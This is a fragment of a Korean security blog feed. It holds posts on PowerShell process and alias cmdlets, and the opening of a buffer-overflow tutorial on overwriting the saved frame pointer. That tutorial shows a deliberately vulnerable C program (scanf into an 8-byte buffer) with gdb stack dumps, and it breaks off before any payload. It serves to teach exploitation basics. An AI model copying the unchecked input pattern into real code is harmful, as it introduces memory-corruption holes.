Cmdlet          Enter-PSHostProcess                                3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Exit-PSHostProcess                                 3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-Process                                        3.1.0.0    Microsoft.PowerShell.Management
Cmdlet          Start-Process                                      3.1.0.0    Microsoft.PowerShell.Management
Cmdlet          Stop-Process                                       3.1.0.0    Microsoft.PowerShell.Management
Cmdlet          Wait-Process                                       3.1.0.0    Microsoft.PowerShell.Management&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;여기서 Start-Process를 이용하여 notepad.exe를 실행시켜 보도록 하겠습니다. 그 전에 Start-Process를 어떻게 사용해야 하는지 알고 싶다면 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Help Start-Process -example&lt;/code&gt;를 입력합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-Help Start-Process -example

이름
    Start-Process

개요
    Starts one or more processes on the local computer.


    Example 1: Start a process that uses default values

    PS C:\&amp;gt;Start-Process -FilePath &quot;sort.exe&quot;

    This command starts a process that uses the Sort.exe file in the current folder. The command uses all of the default values, including the default window style, working folder, and credentials.
    Example 2: Print a text file

    PS C:\&amp;gt;Start-Process -FilePath &quot;myfile.txt&quot; -WorkingDirectory &quot;C:\PS-Test&quot; -Verb Print

    This command starts a process that prints the C:\PS-Test\MyFile.txt file.
    Example 3: Start a process to sort items to a new file

    PS C:\&amp;gt;Start-Process -FilePath &quot;Sort.exe&quot; -RedirectStandardInput &quot;Testsort.txt&quot; -RedirectStandardOutput &quot;Sorted.txt&quot; -RedirectStandardError &quot;SortError.txt&quot; -UseNewEnvironment

    This command starts a process that sorts items in the Testsort.txt file and returns the sorted items in the Sorted.txt files. Any errors are written to the SortError.txt file.

    The UseNewEnvironment parameter specifies that the process runs with its own environment variables.
    Example 4: Start a process in a maximized window

    PS C:\&amp;gt;Start-Process -FilePath &quot;notepad&quot; -Wait -WindowStyle Maximized

    This command starts the Notepad process. It maximizes the window and retains the window until the process completes.
    Example 5: Start Windows Powershell as an administrator

    PS C:\&amp;gt;Start-Process -FilePath &quot;powershell&quot; -Verb runAs

    This command starts Windows PowerShell by using the Run as administrator option.
    Example 6: Using different verbs to start a process

    PS C:\&amp;gt;$startExe = New-Object System.Diagnostics.ProcessStartInfo -Args PowerShell.exe
    PS C:\&amp;gt; $startExe.verbs
    open
    runas

    # Starts a PowerShell process in a new console window.

    PS C:\&amp;gt; Start-Process -FilePath &quot;powershell.exe&quot; -Verb open

    # Starts a PowerShell process with &quot;Run as Administrator&quot; permissions.

    PS C:\&amp;gt; Start-Process -FilePath &quot;powershell.exe&quot; -Verb runas

    These commands show how to find the verbs that can be used when starting a process, and the effect of using the verbs to start the process.

    The available verbs are determined by the file name extension of the file that runs in the process. To find the verbs for a process, create a System.Diagnostics.ProcessStartInfo object for the process file
     and look in the Verbs property of the object. This example uses the PowerShell.exe file that runs in the PowerShell process.

    The first command uses New-Object to create a System.Diagnostics.ProcessStartInfo object for PowerShell.exe, the file that runs in the PowerShell process. The command saves the ProcessStartInfo object in t
    he $startExe variable.

    The second command displays the values in the Verbs property of the ProcessStartInfo object in the $startExe variable. The results show that you can use the Open and Runas verbs with PowerShell.exe, or wit
    h any process that runs a .exe file.

    The third command starts a PowerShell process with the Open verb. The Open verb starts the process in a new console window.

    The fourth command starts a PowerShell process with the RunAs verb. The RunAs verb starts the process with permissions of a member of the Administrators group on the computer. This is the same as starting
    Windows PowerShell by using the Run as administrator option.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Start-Process notepad.exe&lt;/code&gt;를 입력하면 아래와 같이 notepad.exe가 실행된 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/powershell/cmdlet/start_process.png&quot; alt=&quot;powershell_start_process&quot; /&gt;&lt;/p&gt;

&lt;p&gt;반대로 &lt;code class=&quot;highlighter-rouge&quot;&gt;Stop-Process notepad.exe&lt;/code&gt;를 입력하면 아래와 같이 에러가 발생합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Stop-Process notepad.exe
Stop-Process : 'InputObject' 매개 변수를 바인딩할 수 없습니다. &quot;System.String&quot; 유형의 &quot;notepad.exe&quot; 값을 &quot;System.Diagnostics.Process&quot; 유형으로 변환할 수 없습니다.
위치 줄:1 문자:14
+ Stop-Process notepad.exe
+              ~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (:) [Stop-Process], ParameterBindingException
    + FullyQualifiedErrorId : CannotConvertArgumentNoMessage,Microsoft.PowerShell.Commands.StopProcessCommand&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Help&lt;/code&gt;를 이용해서 Stop-Proces에 대한 예시를 살펴봅니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-Help Stop-Process -example

이름
    Stop-Process

개요
    Stops one or more running processes.


    Example 1: Stop all instances of a process

    PS C:\&amp;gt;Stop-Process -Name &quot;notepad&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위와 같이 &lt;code class=&quot;highlighter-rouge&quot;&gt;-Name&lt;/code&gt;이라는 옵션을 이용해야 합니다. 직접 실행해 보면 notepad가 종료된 것을 알 수 있습니다.&lt;/p&gt;</content><author><name></name></author><summary type="html"></summary></entry><entry><title type="html">PowerShell 기초</title><link href="http://localhost:4000/technique/powershell/2017/08/03/PowerShell_basic.html" rel="alternate" type="text/html" title="PowerShell 기초" /><published>2017-08-03T13:20:00+09:00</published><updated>2017-08-03T13:20:00+09:00</updated><id>http://localhost:4000/technique/powershell/2017/08/03/PowerShell_basic</id><content type="html" xml:base="http://localhost:4000/technique/powershell/2017/08/03/PowerShell_basic.html">&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;개념&quot;&gt;개념&lt;/h3&gt;

&lt;p&gt;Linux에서 터미널을 이용하여 ls, pwd 등과 같은 명령어를 사용하는 것 처럼 Windows에서도 명령어들을 이용하여 사용할 수 있도록 하는 것이 PowerShell 입니다.&lt;/p&gt;

&lt;p&gt;물론 Windows에서는 cmd라고 하는 것도 있지만 이보다 더 많은 명령어들이 포함되어 있습니다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/powershell/basic/ps_cmd.png&quot; alt=&quot;powershell_and_cmd&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;설명&quot;&gt;설명&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; ls


    디렉터리: C:\Users\k3y6reak


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---   2017. 7. 31.   오후 8:13                Contacts
d-r---    2017. 8. 2.   오후 2:33                Desktop
d-r---    2017. 8. 2.   오후 2:09                Documents
d-r---    2017. 8. 2.   오후 2:33                Downloads
d-r---   2017. 7. 31.   오후 8:13                Favorites
d-r---   2017. 7. 31.   오후 8:13                Links
d-r---   2017. 7. 31.   오후 8:13                Music
d-r---   2017. 7. 31.   오후 5:35                OneDrive
d-r---   2017. 7. 31.   오후 8:13                Pictures
d-r---   2017. 7. 31.   오후 8:13                Saved Games
d-r---   2017. 7. 31.   오후 8:13                Searches
d-r---   2017. 7. 31.   오후 8:13                Videos


PS C:\Users\k3y6reak&amp;gt; dir


    디렉터리: C:\Users\k3y6reak


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---   2017. 7. 31.   오후 8:13                Contacts
d-r---    2017. 8. 2.   오후 2:33                Desktop
d-r---    2017. 8. 2.   오후 2:09                Documents
d-r---    2017. 8. 2.   오후 2:33                Downloads
d-r---   2017. 7. 31.   오후 8:13                Favorites
d-r---   2017. 7. 31.   오후 8:13                Links
d-r---   2017. 7. 31.   오후 8:13                Music
d-r---   2017. 7. 31.   오후 5:35                OneDrive
d-r---   2017. 7. 31.   오후 8:13                Pictures
d-r---   2017. 7. 31.   오후 8:13                Saved Games
d-r---   2017. 7. 31.   오후 8:13                Searches
d-r---   2017. 7. 31.   오후 8:13                Videos


PS C:\Users\k3y6reak&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;PowerShell에서는 PowerShell에서만 사용할 수 있는 명령어도 있지만 기존에 사용하던 Windows 명령어도 사용이 가능하고, Linux에서 사용하던 명령어도 사용할 수 있습니다.&lt;/p&gt;

&lt;p&gt;Linux에서 명령어를 사용할 때 alias라는 명령어가 있는데 이는 명령어의 별칭을 붙여서 사용할 수 있습니다. 즉, a라고 입력을 하면 ls가 실행이 되도록 하는 것이죠.&lt;/p&gt;

&lt;p&gt;PowerShell에서도 ls, dir이 모두 같은 결과값을 출력하는데 alias를 통해서 같은 명령어를 실행할 것입니다.&lt;/p&gt;

&lt;p&gt;alias에 대한 명령어가 어떤것이 있는지 확인하기 위해서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Help *alias&lt;/code&gt;를 입력합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-Help *alias

Name                              Category  Module                    Synopsis
----                              --------  ------                    --------
Export-Alias                      Cmdlet    Microsoft.PowerShell.U... ...
Get-Alias                         Cmdlet    Microsoft.PowerShell.U... ...
Import-Alias                      Cmdlet    Microsoft.PowerShell.U... ...
New-Alias                         Cmdlet    Microsoft.PowerShell.U... ...
Set-Alias                         Cmdlet    Microsoft.PowerShell.U... ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위 결과값에서 Get-Alias라는 명령어를 볼 수 있는데 모든 명령어를 확인 하기위해서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Alias *&lt;/code&gt;를 입력합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-Alias *

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
...
Alias           dir -&amp;gt; Get-ChildItem
...
Alias           ls -&amp;gt; Get-ChildItem
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; 명령어와 &lt;code class=&quot;highlighter-rouge&quot;&gt;dir&lt;/code&gt; 명령어는 PowerShell에서 Get-ChildItem 명령어가 실행되도록 되어있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;PowerShell에서는 명령어에 대한 예시들을 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Help&lt;/code&gt;를 통해서 알 수 있습니다. 사용하는 OS의 환경에 따라, Get-Help 명령어가 안 될 수도 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-Help Get-Alias

이름
    Get-Alias

구문
    Get-Alias [[-Name] &amp;lt;string[]&amp;gt;]  [&amp;lt;CommonParameters&amp;gt;]

    Get-Alias  [&amp;lt;CommonParameters&amp;gt;]


별칭
    gal


설명
    Get-Help가 이 컴퓨터에서 이 cmdlet에 대한 도움말 파일을 찾을 수 없습니다. 일부 도움말만 표시합니다.
        -- 이 cmdlet을 포함하는 모듈에 대한 도움말 파일을 다운로드하여 설치하려면 Update-Help를 사용하십시오.
        -- 이 cmdlet에 대한 도움말 항목을 온라인으로 보려면 &quot;Get-Help Get-Alias -Online&quot;을 입력하거나
           http://go.microsoft.com/fwlink/?LinkID=113306(으)로 이동하십시오.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위 경우 &lt;code class=&quot;highlighter-rouge&quot;&gt;설명&lt;/code&gt; 부분을 보면 일부 도움말만 표시한다고 되어있는데 Update-Help를 통해서 도움말을 다운로드 합니다. 여기서 중요한 것은 반드시 &lt;code class=&quot;highlighter-rouge&quot;&gt;관리자 권한&lt;/code&gt;으로 실행해야 합니다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/powershell/basic/update_help.png&quot; alt=&quot;powershell_and_cmd&quot; /&gt;&lt;/p&gt;

&lt;p&gt;설치가 완료되면 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Help Get-Alias -examples&lt;/code&gt;를 입력해 봅니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ps&quot; data-lang=&quot;ps&quot;&gt;PS C:\Users\k3y6reak&amp;gt; Get-Help Get-Alias -examples

이름
    Get-Alias

개요
    Gets the aliases for the current session.


    Example 1: Get all aliases in the current session

    PS C:\&amp;gt;Get-Alias
    CommandType     Name
    -----------     ----
    Alias           % -&amp;gt; ForEach-Object
    Alias           ? -&amp;gt; Where-Object
    Alias           ac -&amp;gt; Add-Content
    Alias           asnp -&amp;gt; Add-PSSnapin
    Alias           cat -&amp;gt; Get-Content
    Alias           cd -&amp;gt; Set-Location
    Alias           chdir -&amp;gt; Set-Location
    Alias           clc -&amp;gt; Clear-Content
    Alias           clear -&amp;gt; Clear-Host
    Alias           clhy -&amp;gt; Clear-History â€¦

    This command gets all aliases in the current session.

    The output shows the &amp;lt;alias&amp;gt; -&amp;gt; &amp;lt;definition&amp;gt; format that was introduced in Windows PowerShell 3.0. This format is u
    sed only for aliases that do not include hyphens, because aliases with hyphens are typically preferred names for cm
    dlets and functions, rather than nicknames.
    Example 2: Get aliases by name

    PS C:\&amp;gt;Get-Alias -Name g*, s* -Exclude Get-*

    This command gets all aliases that begin with g or s, except for aliases that begin with Get-.
    Example 3: Get aliases for a cmdlet

    PS C:\&amp;gt;Get-Alias -Definition Get-ChildItem

    This command gets the aliases for the Get-ChildItem cmdlet.

    By default, the Get-Alias cmdlet gets the item name when you know the alias. The Definition parameter gets the alia
    s when you know the item name.
    Example 4: Get aliases by property

    PS C:\&amp;gt;Get-Alias | Where-Object {$_.Options -Match &quot;ReadOnly&quot;}

    This command gets all aliases in which the value of the Options property is ReadOnly. This command provides a quick
     way to find the aliases that are built into Windows PowerShell, because they have the ReadOnly option.

    Options is just one property of the AliasInfo objects that Get-Alias gets. To find all properties and methods of Al
    iasInfo objects, type `Get-Alias | get-member`.
    Example 5: Get aliases by name and filter by beginning letter

    PS C:\&amp;gt;Get-Alias -Definition &quot;*-PSSession&quot; -Exclude e* -Scope Global

    This example gets aliases for commands that have names that end in -PSSession, except for those that begin with e.

    The command uses the Scope parameter to apply the command in the global scope. This is useful in scripts when you w
    ant to get the aliases in the session.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위와 같이 해당 명령어에 대한 예제들도 출력하는 것을 볼 수 있습니다.&lt;/p&gt;</content><author><name></name></author><summary type="html">개념</summary></entry><entry><title type="html">Save Frame Pointer Overwrite</title><link href="http://localhost:4000/technique/system_hacking/2017/07/25/Save_Frame_Pointer_Overwrite.html" rel="alternate" type="text/html" title="Save Frame Pointer Overwrite" /><published>2017-07-25T10:05:00+09:00</published><updated>2017-07-25T10:05:00+09:00</updated><id>http://localhost:4000/technique/system_hacking/2017/07/25/Save_Frame_Pointer_Overwrite</id><content type="html" xml:base="http://localhost:4000/technique/system_hacking/2017/07/25/Save_Frame_Pointer_Overwrite.html">&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;개념&quot;&gt;개념&lt;/h3&gt;

&lt;p&gt;Buffer Overflow가 발생하는 프로그램의 취약점을 이용하여 Save Frame Pinter를 덮어씌워 원하는 주소로 이동하는 방법을 말합니다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;설명&quot;&gt;설명&lt;/h3&gt;

&lt;p&gt;Buffer Overflow에서 잠깐 언급했던 Save Frame Pointer(SFP)는 &lt;code class=&quot;highlighter-rouge&quot;&gt;이전 함수의 ebp&lt;/code&gt;를 저장해 두고 함수의 실행이 끝나면 돌아가는 역할을 했습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Main Func&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sub_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sub_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위 소스코드를 보면 main 함수에서는 출력과 sub_func()을 호출하고 sub_func 함수에서는 buf가 8개의 공간이 할당되었고 scanf를 이용해 buf에 값을 저장합니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
0x0804846d &amp;lt;+0&amp;gt;:	push	ebp
0x0804846e &amp;lt;+1&amp;gt;:	mov 	ebp,esp
0x08048470 &amp;lt;+3&amp;gt;:	sub 	esp,0x4
0x08048473 &amp;lt;+6&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x8048540
0x0804847a &amp;lt;+13&amp;gt;:	call	0x8048330 &amp;lt;puts@plt&amp;gt;
0x0804847f &amp;lt;+18&amp;gt;:	call	0x804848b &amp;lt;sub_func&amp;gt;
0x08048484 &amp;lt;+23&amp;gt;:	mov	eax,0
0x08048489 &amp;lt;+28&amp;gt;:	leave
0x0804848a &amp;lt;+29&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;위 어셈블리 코드에서 puts와 sub_func의 호출을 볼 수 있으며 puts를 호출하기 전 esp에 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x8048540&lt;/code&gt; 값을 저장하고 있습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/s 0x8048540
0x8048540:	&lt;span class=&quot;s2&quot;&gt;&quot;Main Func&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x804847f&lt;/code&gt;에 Breakpoint를 걸고 해당 주소까지 실행해 보도록 하겠습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
	0x0804846d &amp;lt;+0&amp;gt;:	push	ebp
	0x0804846e &amp;lt;+1&amp;gt;:	mov 	ebp,esp
	0x08048470 &amp;lt;+3&amp;gt;:	sub 	esp,0x4
	0x08048473 &amp;lt;+6&amp;gt;:	mov	DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x8048540
	0x0804847a &amp;lt;+13&amp;gt;:	call	0x8048330 &amp;lt;puts@plt&amp;gt;
&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt;	0x0804847f &amp;lt;+18&amp;gt;:	call	0x804848b &amp;lt;sub_func&amp;gt;
	0x08048484 &amp;lt;+23&amp;gt;:	mov	eax,0
	0x08048489 &amp;lt;+28&amp;gt;:	leave
	0x0804848a &amp;lt;+29&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;해당 위치에서 esp 부터 10개의 값은 아래와 같습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/10wx &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
0xbffff154:	0x08048540	0x00000000	0xb7e2fa83	0x00000001
0xbffff164:	0xbffff1f4	0xbffff1fc	0xb7feccea	0x00000001
0xbffff174:	0xbffff1f4	0xbffff194&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;이제 여기서 sub_func 함수 안으로 들어가 보도록 하겠습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;sub_func:
&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt;	0x0804848b &amp;lt;+0&amp;gt;:	push	ebp
	0x0804848c &amp;lt;+1&amp;gt;:	mov 	ebp,esp
	0x0804848e &amp;lt;+3&amp;gt;:	sub 	esp,0x10
	0x08048491 &amp;lt;+6&amp;gt;:	lea	eax,[ebp-0x8]
	0x08048494 &amp;lt;+9&amp;gt;:	mov	DWORD PTR[esp+0x4],eax
	0x08048498 &amp;lt;+13&amp;gt;:	mov	DWORD PTR[esp],0x804854b
	0x0804849f &amp;lt;+20&amp;gt;:	call	0x8048360 &amp;lt;__isoc99_scanf@plt&amp;gt;
	0x080484a4 &amp;lt;+25&amp;gt;:	leave
	0x080484a5 &amp;lt;+26&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;sub_func 함수 내로 들어온 후 esp 값을 확인해보면 아래와 같습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/10wx &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
0xbffff150:	0x08048484	0x08048540	0x00000000	0xb7e2fa83
0xbffff160:	0x00000001	0xbffff1f4	0xbffff1fc	0xb7feccea
0xbffff170:	0x00000001	0xbffff1f4&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;스택에 쌓여진 값을 살펴보면 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x8048484&lt;/code&gt;라는 값을 확인할 수 있는데 이 값은 main함수에서 sub_func이 있는 곳의 다음 주소를 나타냅니다. &lt;code class=&quot;highlighter-rouge&quot;&gt;다음 주소를 쌓아두는 이유는 sub_func 함수가 끝나면 main에서 다음 코드를 실행해야 하기 때문에 쌓아둔 것&lt;/code&gt;이며 이 값이 &lt;code class=&quot;highlighter-rouge&quot;&gt;Return&lt;/code&gt;값이 됩니다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x804849f&lt;/code&gt;에 Breakpoint를 걸고 해당 주소까지 실행 후 스택을 확인해 보도록 하겠습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;sub_func:
	0x0804848b &amp;lt;+0&amp;gt;:	push	ebp
	0x0804848c &amp;lt;+1&amp;gt;:	mov 	ebp,esp
	0x0804848e &amp;lt;+3&amp;gt;:	sub 	esp,0x10
	0x08048491 &amp;lt;+6&amp;gt;:	lea	eax,[ebp-0x8]
	0x08048494 &amp;lt;+9&amp;gt;:	mov	DWORD PTR[esp+0x4],eax
	0x08048498 &amp;lt;+13&amp;gt;:	mov	DWORD PTR[esp],0x804854b
&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;gt;	0x0804849f &amp;lt;+20&amp;gt;:	call	0x8048360 &amp;lt;__isoc99_scanf@plt&amp;gt;
	0x080484a4 &amp;lt;+25&amp;gt;:	leave
	0x080484a5 &amp;lt;+26&amp;gt;:	ret
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/10wx &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
0xbffff13c:	0x0804854b	0xbffff144	0x00000000	0x00000000
0xbffff14c:	0xbffff158	0x08048484	0x08048540	0x00000000
0xbffff15c:	0xb7e2fa83	0x00000001&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;scanf 함수가 사용하는 인자 값은 2개이기 때문에 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x804854b&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff144&lt;/code&gt;가 인자 값이 됩니다.
0x804854b는 &lt;code class=&quot;highlighter-rouge&quot;&gt;%s&lt;/code&gt;가 되며 0xbffff144는 &lt;code class=&quot;highlighter-rouge&quot;&gt;buf의 주소&lt;/code&gt;가 됩니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/10wx 0xbffff144
0xbffff144:	0x00000000	0x00000000	0xbffff158	0x08048484
0xbffff154:	0x08048540	0x00000000	0xb7e2fa83	0x00000001
0xbffff164:	0xbffff1f4	0xbffff1fc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;0xbffff144의 스택을 살펴보면 아직 scanf가 실행되지 않았기 때문에 값이 0x00000000로 되어있는 것을 알 수 있습니다. scanf가 실행되고 난 뒤를 실펴보기 위해 &lt;code class=&quot;highlighter-rouge&quot;&gt;ni&lt;/code&gt;명령으로 실행 후 &lt;code class=&quot;highlighter-rouge&quot;&gt;12345678&lt;/code&gt;값을 입력하고 다시 스택을 살펴보면 아래와 같습니다.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;x/10wx 0xbffff144
